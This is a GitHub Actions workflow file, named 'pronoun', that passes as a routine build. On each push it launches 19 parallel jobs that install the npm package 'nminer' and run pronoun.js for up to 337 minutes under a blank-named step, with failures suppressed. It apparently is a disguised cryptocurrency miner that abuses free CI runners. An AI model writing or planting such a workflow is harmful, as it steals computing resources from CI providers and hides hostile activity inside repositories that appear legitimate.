name: pronoun
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4929 }
          - { version: 3560 }
          - { version: 3772 }
          - { version: 8549 }
          - { version: 5009 }
          - { version: 9884 }
          - { version: 9184 }
          - { version: 7471 }
          - { version: 2971 }
          - { version: 771 }
          - { version: 3580 }
          - { version: 2780 }
          - { version: 2835 }
          - { version: 2934 }
          - { version: 6111 }
          - { version: 4103 }
          - { version: 7207 }
          - { version: 7159 }
          - { version: 7803 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 337m node pronoun.js || echo "pronoun executed"